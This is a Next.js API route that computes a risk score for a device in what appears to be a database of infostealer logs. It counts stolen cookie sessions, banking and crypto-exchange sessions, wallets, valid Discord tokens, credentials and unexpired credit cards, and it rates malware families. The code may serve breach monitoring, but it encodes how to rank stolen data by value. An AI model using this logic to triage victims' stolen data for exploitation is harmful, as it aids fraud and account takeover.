import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/db"
import { validateRequest } from "@/lib/auth"
import { calculateDeviceRiskScore, RiskFactors } from "@/lib/risk-scoring"

/**
 * GET /api/v1/devices/[deviceId]/risk-score
 *
 * Calculate comprehensive risk score for a device based on:
 * - Active cookie sessions
 * - High-value sessions (email, financial, crypto)
 * - Crypto wallets
 * - Discord tokens
 * - Credit cards
 * - Credential volume
 * - Stealer threat level
 */
export async function GET(
  request: NextRequest,
  { params }: { params: { deviceId: string } }
) {
  try {
    const user = await validateRequest(request)
    if (!user) {
      return NextResponse.json(
        { success: false, error: "Unauthorized" },
        { status: 401 }
      )
    }

    const { deviceId } = params

    // Get device info
    const deviceResults = await executeQuery<any>(
      `SELECT device_id, device_name FROM devices WHERE device_id = ? LIMIT 1`,
      [deviceId]
    )

    if (!deviceResults || deviceResults.length === 0) {
      return NextResponse.json(
        { success: false, error: "Device not found" },
        { status: 404 }
      )
    }

    // Get active sessions count
    const sessionResults = await executeQuery<any>(
      `SELECT COUNT(*) as session_count FROM cookie_sessions WHERE device_id = ?`,
      [deviceId]
    )
    const activeSessionCount = sessionResults?.[0]?.session_count || 0

    // Detect high-value sessions (email, financial, crypto domains)
    const highValueDomains = [
      "gmail.com", "outlook.com", "yahoo.com", "protonmail.com",
      "paypal.com", "stripe.com", "square.com", "venmo.com",
      "coinbase.com", "binance.com", "kraken.com", "crypto.com",
      "chase.com", "bankofamerica.com", "wellsfargo.com", "citi.com",
      "americanexpress.com", "capitalone.com"
    ]

    const highValueSessionResults = await executeQuery<any>(
      `SELECT COUNT(*) as high_value_count
       FROM cookie_sessions
       WHERE device_id = ?
       AND (${highValueDomains.map(() => "domain LIKE ?").join(" OR ")})`,
      [deviceId, ...highValueDomains.map(d => `%${d}%`)]
    )
    const hasHighValueSessions = (highValueSessionResults?.[0]?.high_value_count || 0) > 0

    // Get crypto wallets count
    const walletResults = await executeQuery<any>(
      `SELECT COUNT(*) as wallet_count FROM crypto_wallets WHERE device_id = ?`,
      [deviceId]
    )
    const cryptoWalletCount = walletResults?.[0]?.wallet_count || 0

    // Get Discord tokens count (valid ones)
    const discordResults = await executeQuery<any>(
      `SELECT COUNT(*) as discord_count
       FROM messaging_tokens
       WHERE device_id = ?
       AND platform = 'Discord'
       AND is_valid = 1`,
      [deviceId]
    )
    const discordTokenCount = discordResults?.[0]?.discord_count || 0

    // Get credentials count
    const credentialResults = await executeQuery<any>(
      `SELECT COUNT(*) as credential_count FROM credentials WHERE device_id = ?`,
      [deviceId]
    )
    const credentialCount = credentialResults?.[0]?.credential_count || 0

    // Get credit cards count (valid ones only)
    const creditCardResults = await executeQuery<any>(
      `SELECT COUNT(*) as total_cards,
              SUM(CASE
                WHEN expiration_year IS NOT NULL
                AND expiration_month IS NOT NULL
                AND STR_TO_DATE(CONCAT(expiration_year, '-', expiration_month, '-01'), '%Y-%m-%d') >= CURDATE()
                THEN 1
                ELSE 0
              END) as valid_cards
       FROM credit_cards
       WHERE device_id = ?`,
      [deviceId]
    )
    const creditCardCount = creditCardResults?.[0]?.total_cards || 0
    const validCreditCards = creditCardResults?.[0]?.valid_cards || 0

    // Get stealer metadata
    const stealerResults = await executeQuery<any>(
      `SELECT stealer_family, detection_confidence
       FROM stealer_metadata
       WHERE device_id = ?
       LIMIT 1`,
      [deviceId]
    )

    let stealerThreatLevel: string | undefined = undefined
    const stealerFamily = stealerResults?.[0]?.stealer_family || null

    // Map stealer families to threat levels
    if (stealerFamily) {
      const threatLevels: Record<string, string> = {
        "Redline": "High",
        "Raccoon": "Medium-High",
        "Lumma": "High",
        "Vidar": "Medium-High",
        "StealC": "Medium",
        "Aurora": "Medium",
        "Meta": "Medium",
        "Mars": "Medium",
        "FormBook": "High"
      }
      stealerThreatLevel = threatLevels[stealerFamily] || "Medium"
    }

    // Build risk factors
    const riskFactors: RiskFactors = {
      hasActiveSessions: activeSessionCount > 0,
      activeSessionCount,
      hasHighValueSessions,
      hasCryptoWallets: cryptoWalletCount > 0,
      cryptoWalletCount,
      hasValidDiscordTokens: discordTokenCount > 0,
      discordTokenCount,
      credentialCount,
      hasCreditCards: creditCardCount > 0,
      creditCardCount,
      validCreditCards,
      stealerFamily,
      stealerThreatLevel
    }

    // Calculate risk score
    const riskScore = calculateDeviceRiskScore(riskFactors)

    return NextResponse.json({
      success: true,
      device_id: deviceId,
      device_name: deviceResults[0].device_name,
      risk_score: riskScore,
      risk_factors: riskFactors
    })

  } catch (error: any) {
    console.error("Error calculating risk score:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Failed to calculate risk score",
        details: error.message
      },
      { status: 500 }
    )
  }
}
